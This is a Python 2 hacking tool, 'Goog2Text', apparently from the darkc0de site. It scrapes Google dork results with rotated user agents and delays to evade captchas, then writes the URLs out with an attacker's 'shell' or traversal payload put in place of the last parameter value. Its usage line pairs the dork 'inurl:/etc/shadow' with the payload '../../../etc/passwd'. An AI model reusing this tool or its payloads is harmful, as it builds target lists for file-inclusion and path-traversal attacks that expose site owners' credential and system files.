#!/usr/bin/python
#Searches google with a user defined query then writes the results to a file.

#Changelog 1.5: Added random useragents, fixed output for payload, added captcha checker, added time delay
#Changelog 1.4: Fixed the way it finds addresses, better results
#Changelog 1.3: now searches multiple languages and fixed site output bug
#Changelog 1.2: add a shell path onto the sites found
#Changelog 1.1: added the ability to choose how many.

#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import sys, re, string, urllib2, sets, random, time

agents = ['Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)',
		'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)',
		'Microsoft Internet Explorer/4.0b1 (Windows 95)',
		'Opera/8.00 (Windows NT 5.1; U; en)']
		  
def getsites(lang):
	
	page_counter=0
	try:
		#Change this 50 to search for more sites.(multiples of 10)
    		while page_counter < 70:
			time.sleep(3)
        		results_web = 'http://www.google.com/search?q='+str(query)+'&hl='+str(lang)+'&lr=&ie=UTF-8&start='+repr(page_counter)+'&sa=N'
        		request_web = urllib2.Request(results_web)
        		request_web.add_header('User-Agent',random.choice(agents))
        		opener_web = urllib2.build_opener()                           
        		text = opener_web.open(request_web).read()
			if re.search("403 Forbidden", text):
				print "[-] Received Captcha, Exiting Language"
				break
        		names = re.findall(('<span class=a>+[\w\d\?\/\.\=\s\-]+</span>'),text.replace("<b>","").replace("</b>",""))
        		for name in names:
				name = re.sub("- \d+k - </span>"," ",name.replace("<span class=a>","")).replace("</span>","")
				if name not in d:
					d.append(name)
        		page_counter +=10
        
	except IOError:
    		print "[-] Can't connect to Google Web!"+""
	
		  
if len(sys.argv) != 4 and len(sys.argv) != 5:
	print "\n   d3hydr8[at]gmail[dot]com Goog2Text v1.5"
	print "------------------------------------------------"
	print "\nUsage: ./goog2text.py <query> <how many> <file to save results> <payload>"
	print "Ex: ./goog2text.py \"inurl:/etc/shadow\" 200 results.txt ../../../etc/passwd\n"
	sys.exit(1)
	
else:
	print "\n   d3hydr8[at]gmail[dot]com Goog2Text v1.5"
	print "------------------------------------------------"
	print "[+] Searching: Google.com"
	print "[+] Target:",sys.argv[1]
	print "[+] Total:",sys.argv[2]
	print "[+] File:",sys.argv[3]
	try:
		if len(sys.argv) == 5:
			shell=sys.argv[4]
			print "[+] Shell:",shell
		else:
			shell = ""
	except(IndexError):
		print "None"
		pass

print "[+] Agents Loaded:",len(agents)
langs = ["en", "it", "nl", "ru", "ua", "pl", "de", "be", "kr", "fr", "es", "se", "no", "ir", "za"]
print "[+] Languages:",len(langs),"\n"
		
if sys.argv[2].isdigit() == False:
	print "\n[-] Argument [",sys.argv[2],"] must be a number.\n"
	sys.exit(1)
if int(sys.argv[2]) <= 10:
	print "\n[-] Argument [",sys.argv[2],"] must be greater than 10.\n"
	sys.exit(1)

query = re.sub("\s","+",sys.argv[1])	
d=[]

while len(d) < int(sys.argv[2]):
	for lang in langs:
		print "[+] Language:",lang
		getsites(lang)
		langs.remove(lang)
		d = list(sets.Set(d))
		print "[+] Found:",len(d)
	if len(langs) == 0:
		break
		
file = open(sys.argv[3], "a")
print "\n[+] Found:",len(d)
print "[+] Writing Data:",sys.argv[3]
for sites in d:	
	if sites.find('www') != -1:
		site = sites[sites.find('www'):]
	if shell != "" and site.find('=') != -1:
		file.writelines(site.rsplit("=",1)[0]+"="+shell+"\n")
	else:
		file.writelines(site+"\n")
file.close()
print "[-] Done\n"

